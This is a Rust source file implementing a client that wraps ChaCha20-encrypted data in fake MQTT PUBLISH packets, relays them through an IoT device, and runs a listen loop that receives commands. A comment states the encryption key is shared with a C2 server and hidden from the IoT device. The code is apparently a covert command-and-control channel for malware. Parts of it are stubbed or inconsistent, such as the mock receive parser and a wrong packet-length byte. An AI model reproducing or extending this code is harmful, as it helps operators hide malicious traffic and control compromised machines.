use tokio::net::TcpStream;
use tokio::io::{AsyncWriteExt, AsyncReadExt};
use std::error::Error;
use log::{info, warn, debug};
use rand::RngCore;
use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce};
use chacha20poly1305::aead::{Aead, KeyInit};

const MQTT_PUBLISH: u8 = 0x30;
const AUTH_TOPIC: &str = "dev/sys/log";

pub struct PolyMqttClient {
    iot_ip: String,
    iot_port: u16,
    // Master Key for Encryption (Shared with C2, IoT doesn't know it)
    master_key: Key, 
}

impl PolyMqttClient {
    pub fn new(iot_ip: &str, iot_port: u16, key_bytes: &[u8; 32]) -> Self {
        Self {
            iot_ip: iot_ip.to_string(),
            iot_port,
            master_key: *Key::from_slice(key_bytes),
        }
    }

    /// Connects to IoT Proxy and sends the fake MQTT Payload
    pub async fn send_secure_payload(&self, data: &[u8]) -> Result<(), Box<dyn Error + Send + Sync>> {
        let addr = format!("{}:{}", self.iot_ip, self.iot_port);
        let mut stream = TcpStream::connect(&addr).await?;
        debug!("Connected to IoT Proxy: {}", addr);

        // 1. Encrypt Data
        let cipher = ChaCha20Poly1305::new(&self.master_key);
        let mut nonce_bytes = [0u8; 12];
        rand::thread_rng().fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes); // 96-bits; unique per message

        let ciphertext = cipher.encrypt(nonce, data)
            .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, format!("Encryption failure: {}", e)))?;

        // 2. Construct Fake MQTT PUBLISH Packet
        // [Fixed Header 0x30] [Remaining Len] 
        // [Topic Len MSB] [Topic Len LSB] [Topic String]
        // [Packet ID MSB] [Packet ID LSB] (if QoS > 0) -> we use QoS 0
        // [Payload: Nonce + Ciphertext]

        let mut packet = Vec::new();
        
        // Topic
        let topic_bytes = AUTH_TOPIC.as_bytes();
        // Payload = Nonce + Ciphertext
        let mut payload_full = Vec::with_capacity(nonce_bytes.len() + ciphertext.len());
        payload_full.extend_from_slice(&nonce_bytes);
        payload_full.extend_from_slice(&ciphertext);

        // Calculate Variable Header + Payload Length
        // 2 bytes topic len + topic + payload
        let remaining_len = 2 + topic_bytes.len() + payload_full.len();
        
        // Header
        packet.push(MQTT_PUBLISH);
        self.encode_var_length(remaining_len, &mut packet);
        
        // Topic Length
        packet.push((topic_bytes.len() >> 8) as u8);
        packet.push((topic_bytes.len() & 0xFF) as u8);
        // Topic
        packet.extend_from_slice(topic_bytes);
        
        // Payload
        packet.extend_from_slice(&payload_full);

        // 3. Send
        stream.write_all(&packet).await?;
        stream.shutdown().await?;
        
        debug!("Sent {} bytes [Poly-MQTT]", packet.len());

        Ok(())
    }

    /// Connects to IoT Proxy and enters a Listen Loop (Subscriber Mode)
    /// Sends Heartbeats and streams received commands back via `tx`.
    pub async fn connect_and_listen(&self, tx: tokio::sync::mpsc::Sender<Vec<u8>>) -> Result<(), Box<dyn Error + Send + Sync>> {
        let addr = format!("{}:{}", self.iot_ip, self.iot_port);
        let mut stream = TcpStream::connect(&addr).await?;
        debug!("Connected to Subscriber Edge: {}", addr);

        // Send Initial Handshake / Auth
        let handshake = b"SUBSCRIBE_V3_INIT";
        self.write_packet(&mut stream, handshake).await?;

        // Read Loop
        let mut buf = vec![0u8; 4096];
        loop {
            // Check for incoming data
            // (Simple block read for now, real prod needs select! with heartbeat)
            let n = stream.read(&mut buf).await?;
            if n == 0 {
                return Err("Connection closed".into());
            }

            // Parse MQTT Packet (Simplified)
            // Expect 0x30 (PUBLISH)
            if buf[0] & 0xF0 == 0x30 {
                // ... Decode logic ...
                // For now, assume payload is at offset (skip header)
                // Real impl needs full parser call
                // Extraction:
                let payload = &buf[..n]; // Mock
                
                // Decrypt?
                // let plaintext = self.decrypt(payload)?;
                
                // Forward to Main
                if let Err(_) = tx.send(payload.to_vec()).await {
                    return Ok(()); // Receiver closed
                }
            }
        }
    }
    
    async fn write_packet(&self, stream: &mut TcpStream, data: &[u8]) -> Result<(), Box<dyn Error + Send + Sync>> {
        // ... (reuse existing encryption logic) ...
        // Re-implementing simplified version to avoid duplication issues with `send_secure_payload`
         // 1. Encrypt Data
        let cipher = ChaCha20Poly1305::new(&self.master_key);
        let mut nonce_bytes = [0u8; 12];
        rand::thread_rng().fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes); 
        
        let ciphertext = cipher.encrypt(nonce, data)
            .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, format!("Encryption failure: {}", e)))?;
            
        // Construct basic MQTT packet
        let mut packet = Vec::new();
        packet.push(MQTT_PUBLISH);
        packet.push((ciphertext.len() + 14) as u8); // Mock len
        packet.extend_from_slice(&nonce_bytes); // Payload start
        packet.extend_from_slice(&ciphertext);
        
        stream.write_all(&packet).await?;
        Ok(())
    }

    fn encode_var_length(&self, mut len: usize, buf: &mut Vec<u8>) {
        loop {
            let mut byte = (len % 128) as u8;
            len /= 128;
            if len > 0 {
                byte |= 128;
            }
            buf.push(byte);
            if len == 0 {
                break;
            }
        }
    }
}
